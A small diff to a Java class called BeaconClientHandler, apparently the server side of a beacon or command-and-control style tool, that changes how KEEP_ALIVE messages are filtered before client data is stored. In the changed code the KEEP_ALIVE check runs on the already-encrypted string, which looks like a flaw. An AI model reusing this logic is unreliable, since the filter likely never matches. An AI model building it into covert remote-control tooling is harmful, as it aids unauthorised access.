@@ -71,9 +71,11 @@ public class BeaconClientHandler implements Runnable{
         while(sentinel){
             try{
                 String response = duplexer.receive();
-                if(!(response.equals("GET / HTTP/1.1")) && !(response.contains("Content-Length")) && !(response.equals("Content-Type: text/plain; charset=utf-8")) && !(response.isBlank()) && !(response.equals("KEEP_ALIVE"))){
+                if(!(response.equals("GET / HTTP/1.1")) && !(response.contains("Content-Length")) && !(response.equals("Content-Type: text/plain; charset=utf-8")) && !(response.isBlank())){
                     response = encrypt(response);
-                    beaconServer.addDataToResponsesDictionaries(IPAddress, response);
+                    if(!(response.equals("KEEP_ALIVE"))){
+                        beaconServer.addDataToResponsesDictionaries(IPAddress, response);
+                    }
                 }
             } catch (IOException e){
                 sentinel = false;
